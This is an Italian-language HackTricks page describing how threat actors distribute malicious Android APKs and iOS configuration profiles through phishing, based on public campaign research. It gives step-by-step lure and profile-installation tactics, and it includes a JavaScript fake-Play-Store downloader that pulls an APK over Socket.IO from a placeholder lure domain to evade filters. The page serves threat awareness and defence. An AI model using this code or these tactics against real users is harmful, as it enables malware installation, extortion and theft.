# Phishing mobile e distribuzione di app malevole (Android e iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina illustra le tecniche usate dai threat actor per distribuire **APK Android malevoli** e **profili di configurazione mobile iOS** tramite phishing (SEO, social engineering, store falsi, app di dating ecc.).
> Il materiale è tratto dalla campagna SarangTrap, esposta da Zimperium zLabs (2025), e da altre ricerche pubbliche.<sup>[[1]](#references)</sup>

## Flusso dell'attacco

1. **Infrastruttura SEO/phishing**
   * Registrare decine di domini simili a quelli legittimi (dating, condivisione cloud, servizi automobilistici…).  
     – Usare parole chiave ed emoji nella lingua locale nell'elemento `<title>` per posizionarsi su Google.  
     – Ospitare *sia* le istruzioni di installazione Android (`.apk`) *sia* quelle iOS sulla stessa landing page.
2. **Download del primo stadio**
   * Android: link diretto a un APK *non firmato* o proveniente da uno “store di terze parti”.  
   * iOS: link `itms-services://` o HTTPS semplice a un profilo **mobileconfig** malevolo (vedi sotto).
3. **Comportamento Android dopo l'installazione**
   * L'esecuzione subordinata alla disponibilità del C2, l'abuso dei permessi, le tecniche per aggirare le protezioni dei dropper, la raccolta in background e altri comportamenti malware successivi all'installazione sono trattati nella pagina dedicata qui sotto.
4. **Tecnica di distribuzione iOS**
   * Un singolo **profilo di configurazione mobile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per iscrivere il dispositivo a una supervisione simile a “MDM”.  
   * Istruzioni di social engineering:
     1. Aprire Impostazioni ➜ *Profilo scaricato*.
     2. Toccare *Installa* tre volte (con screenshot sulla pagina di phishing).  
     3. Autorizzare il profilo non firmato ➜ l'attaccante ottiene le autorizzazioni per *Contatti* e *Foto* senza revisione dell'App Store.
5. **Payload Web Clip per iOS (icona dell'app di phishing)**
   * I payload `com.apple.webClip.managed` possono **fissare un URL di phishing alla schermata Home** con un'icona e un'etichetta personalizzate.
   * I Web Clip possono essere eseguiti **a schermo intero** (nascondendo l'interfaccia del browser) e impostati come **non rimovibili**, obbligando la vittima a eliminare il profilo per rimuovere l'icona.<sup>[[3]](#references)</sup>
6. **Livello di rete**
   * HTTP semplice, spesso sulla porta 80 con un header HOST del tipo `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (senza TLS → facile da individuare).

## Post-exploitation di malware Android

Per le tecniche post-installazione usate dai malware Android, tra cui C2, abuso di Accessibility, overlay, automazione ATS, caricamento di DEX a fasi, SMS premium e persistenza, vedere:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK smuggling basato su Socket.IO/WebSocket e pagine false di Google Play

Gli attaccanti sostituiscono sempre più spesso i link statici agli APK con un canale Socket.IO/WebSocket integrato in esche che imitano Google Play. Questo nasconde l'URL del payload, aggira i filtri basati su URL o estensione e mantiene un'esperienza di installazione realistica.<sup>[[2]](#references)[[4]](#references)</sup>

Flusso tipico del client osservato in natura:

<details>
<summary>Downloader falso di Play basato su Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Perché elude i controlli semplici:
- Non viene esposto alcun URL APK statico; il payload viene ricostruito in memoria a partire dai frame WebSocket.
- I filtri URL/MIME/estensione che bloccano le risposte .apk dirette potrebbero non rilevare i dati binari trasmessi tramite WebSocket/Socket.IO.
- I crawler e le sandbox per URL che non eseguono WebSocket non recupereranno il payload.

Vedi anche tecniche e strumenti per WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Il lato oscuro del romanticismo: campagna di estorsione SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Impostazioni del payload Web Clips per dispositivi Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan bancario che prende di mira gli utenti Android indonesiani e vietnamiti](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
